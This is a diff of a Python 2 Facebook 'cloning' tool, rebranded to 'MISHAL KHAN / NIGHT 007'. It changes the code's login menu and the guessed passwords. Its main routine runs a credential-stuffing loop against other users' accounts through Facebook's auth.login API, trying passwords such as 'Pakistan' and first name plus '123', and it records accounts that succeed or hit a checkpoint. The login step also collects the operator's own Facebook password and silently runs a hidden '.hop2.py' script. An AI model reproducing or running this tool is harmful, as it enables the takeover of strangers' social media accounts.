@@ -1,3 +1,4 @@
+#!coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -9,8 +10,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36 OPR/59.1.2926.54067')]
 
 def keluar():
 	print "\033[1;96m[!] \x1b[1;91mExit"
@@ -34,26 +34,30 @@ def jalan(z):
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(00000.1)
+def hamza(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.1)
 ##### LOGO #####
 logo = """
-       _                 
-      | |                
-      | | __ _ _ __ ___  
-  _   | |/ _` | '_ ` _ \ 
- | |__| | (_| | | | | | |
-  \____/ \__,_|_| |_| |_|
-                         
-\033[1;92m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mJAM
-\033[1;96mYouTube \033[1;93m: \033[1;92mJAM SHAHRUKH TECHNICAL
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/JAM
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/Jam-Shahrukh
-\033[1;92m======================================="""
+\033[1;92m___  ________ _____ _   _   ___   _   
+\033[1;92m|  \/  |_   _/  ___| | | | / _ \ | |    
+\033[1;92m| .  . | | | \ `--.| |_| |/ /_\ \| |    
+\033[1;92m| |\/| | | |  `--. \  _  ||  _  || |    
+\033[1;92m| |  | |_| |_/\__/ / | | || | | || |____
+\033[1;92m\_|  |_/\___/\____/\_| |_/\_| |_/\_____/
+                                        
+\033[1;97m=======================================
+\033[1;91mOwNeR  \033[1;93m: \033[1;94mMISHAL KHAN
+\033[1;91mGitHub  \033[1;93m: \033[1;94mhttps://github.com/MISHI
+\033[1;91mGang \033[1;93m: \033[1;94mNIGHT 007
+\033[1;97m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		
-		print("\r\033[1;96m \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m \x1b[1;93mPlease Wait \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 back = 0
 berhasil = []
 cekpoint = []
@@ -63,16 +67,15 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 os.system("clear")
-print "\033[1;96m ========================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mJAM
-\033[1;96mYouTube \033[1;93m: \033[1;92mJAM SHAHRUKH TECHNICAL
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/JAM
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/Jam-Shahrukh
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+print "\033[1;97m ========================================="
+print  """\033[1;97m=======================================
+\033[1;91mOwNeR  \033[1;93m: \033[1;94mMISHAL KHAN
+\033[1;91mGitHub  \033[1;93m: \033[1;94mhttps://github.com/MISHI
+\033[1;91mGang \033[1;93m: \033[1;94mNIGHT 007
+\033[1;97m======================================="""
+print " \x1b[1;97m=========================================="
+CorrectUsername = "mishi"
+CorrectPassword = "mishi"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -87,62 +90,71 @@ while (loop == 'true'):
     else:
         print "Wrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-def login():
+def methodlogin():
 	os.system('clear')
-	try:
-		toket = open('login.txt','r')
-		menu() 
-	except (KeyError,IOError):
+	print logo
+	print "[1] Login With ID/Password."
+	print "[2] Login Using Token."
+	print "[3] Exit."
+	print ('      ')
+	hos = raw_input("\nChoose Option >>  ")
+	if hos =="":
+		print"[!]  Wrong Input"
+		exit()
+	elif hos =="1":
+		login()
+	elif hos =="2":
 		os.system('clear')
 		print logo
-		print " ONLY LOGIN NEW FB ACCOUNT . IF YOU DONT HAVE MAKE IT FIRST "
-		print 42*"\033[1;96m="
-		print('\033[1;96m\x1b[1;93mLOGIN WITH FACEBOOK \x1b[1;96m' )
-		id = raw_input('\033[1;96m \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
+		hosp = raw_input("[+] Give Token : ")
 		tik()
-		try:
-			br.open('https://m.facebook.com')
-		except mechanize.URLError:
-			print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-			keluar()
-		br._factory.is_html = True
-		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
-		br.submit()
-		url = br.geturl()
-		if 'save-device' in url:
-			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
-				x=hashlib.new("md5")
-				x.update(sig)
-				a=x.hexdigest()
-				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
-				r=requests.get(url,params=data)
-				z=json.loads(r.text)
-				unikers = open("login.txt", 'w')
-				unikers.write(z['access_token'])
-				unikers.close()
-				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
-				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				menu()
-			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m \x1b[1;91mThere is no internet connection"
-				keluar()
-		if 'checkpoint' in url:
-			print("\n\033[1;96m \x1b[1;91mIt seems that your account has a checkpoint")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			keluar()
+		hopa = open('login.txt','w')
+		hopa.write(hosp)
+		hopa.close()
+		print "\n[✓] Logged In Successfully."
+		time.sleep(1)
+		os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		menu()
+	elif hos =="0":
+		exit()
+	else:
+		print"[!] Wrong Input"
+		exit()
+def login():
+	os.system("clear")
+	try:
+		tb=open('login.txt', 'r')
+		os.system("python2 .hop2.py")
+	except (KeyError,IOError):
+		os.system("clear")
+		print (logo)
+		hamza('[+] Login Your Facebook Account')
+		hamza('[!] NIGHT 007 OWNER MISHAL KHAN')
+		print'-------------------------------------'
+		iid=raw_input('[+] Number/Email: ')
+		id=iid.replace(" ","")
+		pwd=raw_input('[+] Password : ')
+		tik()
+		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		z=json.load(data)
+		if 'access_token' in z:
+		    st = open("login.txt", "w")
+		    st.write(z["access_token"])
+		    st.close()
+		    print "\n[✓] Logged In Successfully."
+		    time.sleep(1)
+		    os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+		    os.system("clear")
+		    menu()
 		else:
-			print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong")
-			os.system('rm -rf login.txt')
-			time.sleep(1)
-			login()
+		    if "www.facebook.com" in z["error_msg"]:
+		        print ('[!] User Must Verify Account Before Login.')
+		        time.sleep(3)
+		        login()
+		    else:
+		        print ('[!]Number/User Id/ Password Is Wrong !')
+		        time.sleep(1)
+		        login()
 def menu():
 	os.system('clear')
 	try:
@@ -169,12 +181,12 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print " JAM KING OF FACEBOOK "
+	print " MISHAL QUEEN OF FACEBOOK "
 	print 42*"\033[1;96m="
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH JAM"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH MISHI"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
@@ -307,7 +319,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '123'
+							pass3 = 'Pakistan'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -321,7 +333,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = b['first_name'] + '123'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -349,7 +361,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'pakistan'
+													pass6 = b['first_name'] + '1234'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -392,4 +404,4 @@ def pilih_super():
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 if __name__ == '__main__':
-	login()
+	methodlogin()
